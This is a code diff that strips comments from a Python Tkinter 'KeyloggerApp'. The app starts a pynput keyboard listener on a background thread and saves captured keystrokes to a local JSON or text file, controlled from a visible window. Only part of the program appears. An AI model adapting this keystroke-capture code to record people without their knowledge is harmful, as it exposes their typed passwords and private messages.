@@ -12,20 +12,19 @@ class KeyloggerApp:
         self.root.geometry("400x250")
         self.root.resizable(False, False)
         
-        # --- CHANGE IS HERE ---
-        # Set the background color of the main window to blue
+       
         self.root.config(bg='blue')
 
-        # --- Keylogger State ---
+      
         self.listener = None
         self.log = []
         self.is_logging = False
 
-        # --- GUI Elements ---
+      
         self.create_widgets()
 
     def create_widgets(self):
-        # Frame for buttons
+        
         button_frame = ttk.Frame(self.root, padding="10")
         button_frame.pack(fill=tk.X)
 
@@ -35,10 +34,10 @@ class KeyloggerApp:
         self.stop_button = ttk.Button(button_frame, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
         self.stop_button.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=5)
 
-        # Separator
+        
         ttk.Separator(self.root, orient=tk.HORIZONTAL).pack(fill=tk.X, pady=10)
 
-        # Frame for file format selection
+        
         format_frame = ttk.LabelFrame(self.root, text="Log File Format", padding="10")
         format_frame.pack(fill=tk.X, padx=10, pady=5)
 
@@ -46,7 +45,7 @@ class KeyloggerApp:
         ttk.Radiobutton(format_frame, text="Save as JSON (.json)", variable=self.file_format, value="json").pack(anchor=tk.W)
         ttk.Radiobutton(format_frame, text="Save as Text (.txt)", variable=self.file_format, value="text").pack(anchor=tk.W)
 
-        # Status Label
+        
         self.status_label = ttk.Label(self.root, text="Status: Idle", font=("Helvetica", 10))
         self.status_label.pack(pady=10)
 
@@ -71,14 +70,14 @@ class KeyloggerApp:
             return
 
         self.is_logging = True
-        self.log = []  # Clear previous logs
+        self.log = []  
         self.status_label.config(text="Status: Logging...", foreground="green")
         
-        # Disable start button and enable stop button
+        
         self.start_button.config(state=tk.DISABLED)
         self.stop_button.config(state=tk.NORMAL)
 
-        # Start the listener in a new thread to avoid blocking the GUI
+     
         self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
         self.listener_thread = threading.Thread(target=self.listener.start, daemon=True)
         self.listener_thread.start()
@@ -92,14 +91,13 @@ class KeyloggerApp:
         self.is_logging = False
         self.status_label.config(text="Status: Stopping...", foreground="orange")
         
-        # Stop the listener
+      
         if self.listener:
             self.listener.stop()
 
-        # Save the log file
         self.save_log()
 
-        # Update GUI
+      
         self.status_label.config(text="Status: Idle", foreground="black")
         self.start_button.config(state=tk.NORMAL)
         self.stop_button.config(state=tk.DISABLED)
@@ -127,7 +125,7 @@ class KeyloggerApp:
             with open("keylog.txt", "w") as f:
                 for entry in self.log:
                     key_str = entry['key']
-                    # Clean up special key names for readability
+                   
                     if key_str.startswith("Key."):
                         key_str = f"[{key_str.split('.')[1].upper()}]"
                     
@@ -140,3 +138,4 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = KeyloggerApp(root)
     root.mainloop()
+
